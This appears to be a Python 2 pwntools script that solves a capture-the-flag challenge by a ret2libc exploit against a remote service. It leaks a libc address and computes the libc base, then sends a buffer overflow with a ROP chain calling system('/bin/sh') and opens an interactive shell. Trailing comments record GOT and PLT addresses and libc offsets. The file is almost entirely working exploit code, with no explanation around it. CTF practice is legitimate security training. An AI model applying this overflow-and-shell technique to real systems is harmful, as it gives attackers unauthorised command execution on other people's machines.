from pwn import *
host, port = "ctf.adl.csie.ncu.edu.tw", 11006
p = remote(host, port)
#p = process('./ret2libc')

print p.recv()
p.sendline("6295608")  # 0x601038 start_main

print p.recvuntil("is ")
addr = p.readline().split('.')[0]
print "addr: " + addr

addr = int(addr, 16)
print p.recv()

shellcode = 'aaaaa' + '\x00' * 35


poprdi = 0x00400873
#binsh_addr = addr + 0x16c5d7 
base_addr = addr - 0x20740

"""
binsh_addr = addr + 0x16c517
system = addr + 0x24c40
return_addr = 0x004005b1
"""

binsh_addr = base_addr + 0x18c58b
system = base_addr + 0x0000000000045380
return_addr = 0x004005b1

shellcode += p64(poprdi) + p64(binsh_addr) + p64(system) + p64(return_addr)
p.sendline(shellcode)
p.interactive()


"""
elfsymbol:
puts@plt = 0x4005d0
__libc_start_main@plt = 0x400610
setvbuf@plt = 0x400630

=================================
GOTPLOT
puts = 0x601018  0x00007ffff7a7c690
start_main => 0x601038 0x00007ffff7a2d740
setvbuf => 0x601048  0x00007ffff7a7ce70
puts - start = 0x4ef50
setvbuf - start = 0x4f730    (0x4f730-0x4f670=0xc0)
setvbuf - puts = 0x7e0
system -> 0x7ffff7a52390
system - start = 0x24c50

'bin/sh' : 0x7ffff7b99d17    (0x68732f6e69622f)
/bin/sh - main = 0x16c5d7

puts 0x4005d6
main 0x7f2bf364a740
setvbuf 0x7f0017f6bdb0


===========================
libc.so
start_main => 0x20740
puts => 0x6f5d0
setvbuf -> 0x6fdb0
puts - start = 0x4ee90
setvbuf - start = 0x4f670
setvbuf - puts = 0x7e0

system => 0x45380
system - setvbuf = -0x2aa30
system-start = 0x24c40


===========================
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045380
offset_dup2 = 0x00000000000f70c0
offset_read = 0x00000000000f69a0
offset_write = 0x00000000000f6a00
offset_str_bin_sh = 0x18c58b
"""

